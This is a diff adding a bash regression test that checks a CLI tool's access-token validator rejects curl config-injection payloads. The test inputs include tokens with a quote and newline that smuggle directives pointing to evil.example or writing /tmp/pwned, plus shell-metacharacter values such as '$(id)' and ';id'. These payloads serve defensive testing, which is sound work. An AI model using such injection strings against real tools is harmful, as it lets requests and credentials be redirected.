@@ -1,0 +1,99 @@
+#!/usr/bin/env bash
+# Regression test for the credential parser boundary.
+#
+# The access token is somebody else's bytes: it arrives in a login response and
+# is read back from a file that something else could have edited. It is then
+# handed to curl, whose config file is a grammar -- so a token carrying a quote
+# and a newline could once have closed the header value and opened a directive
+# of its own, pointing the next authenticated request at another URL or writing
+# the response somewhere else.
+#
+# Two things stop that now, and this checks both: nothing that is not shaped
+# like a credential is ever stored or used, and where curl can substitute a
+# variable after parsing, the bytes never reach the grammar at all.
+
+set -uo pipefail
+HERE=$(cd "$(dirname "$0")/.." && pwd)
+
+OMARCHY_SPOND_LIB=1 source "$HERE/bin/spond"
+
+pass=0; fail=0
+check() {
+  local desc="$1" expect="$2" token="$3" got
+  if valid_token "$token"; then got=accept; else got=reject; fi
+  if [ "$got" = "$expect" ]; then
+    pass=$((pass + 1)); printf '  ok      %s\n' "$desc"
+  else
+    fail=$((fail + 1)); printf '  FAIL    %s — expected %s, got %s\n' "$desc" "$expect" "$got"
+  fi
+}
+
+echo "valid_token — what a credential may be"
+check "a Spond token: base64 with padding"      accept "$(printf 'A%.0s' $(seq 1 526))=="
+check "a JWT, should they ever switch"          accept "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"
+check "base64url with - and _"                  accept "abcDEF123-_~+/=abcDEF123"
+
+echo "valid_token — the payloads this exists for"
+check "a quote"                                 reject 'abcdefghijklmnop"qrst'
+check "quote then a curl directive"             reject "$(printf 'abcdefghijklmnop"\nurl = https://evil.example/\n')"
+check "quote then an output redirect"           reject "$(printf 'abcdefghijklmnop"\noutput = /tmp/pwned\n')"
+check "a bare newline"                          reject "$(printf 'abcdefghijklmnop\nqrst')"
+check "a carriage return"                       reject "$(printf 'abcdefghijklmnop\rqrst')"
+check "a backslash"                             reject 'abcdefghijklmnop\qrst'
+check "a space"                                 reject 'abcdefghijklmnop qrst'
+check "a tab"                                   reject "$(printf 'abcdefghijklmnop\tqrst')"
+check "a NUL-adjacent control character"        reject "$(printf 'abcdefghijklmnop\001qrst')"
+check "shell metacharacters"                    reject 'abcdefghijklmnop$(id)'
+check "a semicolon"                             reject 'abcdefghijklmnop;id'
+
+echo "valid_token — bounds"
+check "empty"                                   reject ""
+check "shorter than any real token"             reject "abc"
+check "longer than the ceiling"                 reject "$(printf 'A%.0s' $(seq 1 5000))"
+
+echo "a poisoned token file is discarded, not used"
+tmp=$(mktemp -d "${TMPDIR:-/tmp}/spond-test.XXXXXX")
+marker="$tmp/injected"
+export OMARCHY_SPOND_CONFIG_DIR="$tmp/config" OMARCHY_SPOND_CACHE_DIR="$tmp/cache"
+mkdir -p "$OMARCHY_SPOND_CONFIG_DIR" "$OMARCHY_SPOND_CACHE_DIR"
+printf 'abcdefghijklmnop"\noutput = %s\nurl = https://127.0.0.1:9/\n' "$marker" > "$OMARCHY_SPOND_CONFIG_DIR/access-token"
+printf '%s\n' "$(( $(date +%s) + 3600 ))" > "$OMARCHY_SPOND_CONFIG_DIR/access-token-expires"
+
+out=$("$HERE/bin/spond" groups 2>/dev/null)
+code=$(printf '%s' "$out" | jq -r '.code // ""' 2>/dev/null)
+
+if [ "$code" = "NOT_SIGNED_IN" ]; then
+  pass=$((pass + 1)); printf '  ok      the poisoned token was refused, not sent\n'
+else
+  fail=$((fail + 1)); printf '  FAIL    expected NOT_SIGNED_IN, got: %s\n' "${out:0:200}"
+fi
+if [ ! -e "$marker" ]; then
+  pass=$((pass + 1)); printf '  ok      no injected output target was written\n'
+else
+  fail=$((fail + 1)); printf '  FAIL    the injected directive created %s\n' "$marker"
+fi
+if [ ! -e "$OMARCHY_SPOND_CONFIG_DIR/access-token" ]; then
+  pass=$((pass + 1)); printf '  ok      the poisoned file was thrown away\n'
+else
+  fail=$((fail + 1)); printf '  FAIL    the poisoned token file is still there\n'
+fi
+rm -rf "$tmp"
+# Back to the real account for the check below; the poisoned run had its own.
+unset OMARCHY_SPOND_CONFIG_DIR OMARCHY_SPOND_CACHE_DIR
+
+# The config-file path is what curl older than 8.3 gets. Nothing poisoned can
+# reach it -- valid_token runs first -- but it still has to work, and only a
+# signed-in machine can prove that, so this one skips when there is no account.
+echo "the pre-8.3 fallback still works"
+if "$HERE/bin/spond" status 2>/dev/null | jq -e '.signedIn == true' >/dev/null 2>&1; then
+  if CURL_EXPANDS=no "$HERE/bin/spond" events --days 1 2>/dev/null | jq -e '.ok == true' >/dev/null 2>&1; then
+    pass=$((pass + 1)); printf '  ok      a signed request succeeds with --config on stdin\n'
+  else
+    fail=$((fail + 1)); printf '  FAIL    the config-file fallback could not make a signed request\n'
+  fi
+else
+  printf '  skip    not signed in; run `bin/spond login` to cover this one\n'
+fi
+
+printf '\n%d passed, %d failed\n' "$pass" "$fail"
+[ "$fail" -eq 0 ]
